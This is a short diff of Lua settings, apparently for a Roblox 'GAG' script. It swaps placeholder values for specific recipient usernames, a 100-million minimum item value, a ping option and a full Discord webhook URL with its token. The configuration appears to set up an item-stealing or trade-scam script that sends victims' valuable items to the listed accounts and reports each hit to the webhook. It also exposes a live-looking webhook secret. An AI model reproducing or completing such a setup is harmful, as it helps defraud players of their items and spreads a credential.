@@ -1,5 +1,5 @@
 GAG settings:
-_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
-_G.min_value = 100000000 -- 100 million
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+_G.Usernames = {"AxolotlBestYo", "JohnScriptBlox", "JohnScriptBlox2"}
+_G.min_value = 100000000
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1374587479180574871/mylwKkEEBQPSLM42lZEGxTxNsQ3G8UJJfdqQ75D-TH_Qg4l0ofgim0q2YEtpG-y9S3Xd" -- change to your webhook
